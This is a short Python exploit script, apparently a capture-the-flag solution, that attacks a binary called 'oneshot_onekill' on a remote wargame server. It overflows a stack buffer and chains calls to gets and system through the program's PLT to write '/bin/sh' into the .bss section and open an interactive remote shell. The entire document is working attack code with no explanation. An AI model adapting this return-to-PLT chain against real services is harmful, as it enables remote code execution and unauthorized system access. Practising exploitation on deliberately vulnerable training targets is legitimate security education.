from ptrlib import *

elf = ELF("./oneshot_onekill")
#sock = Process("./oneshot_onekill")
sock = Socket("prob.vulnerable.kr", 20026)

payload = b"A" * 0x130
payload += p32(elf.plt("gets"))
payload += p32(0x08048399)
payload += p32(elf.section(".bss") + 0x100)
payload += p32(elf.plt("system"))
payload += p32(0x08048399)
payload += p32(elf.section(".bss") + 0x100)
sock.sendline(payload)
sock.sendline("/bin/sh")

sock.interactive()
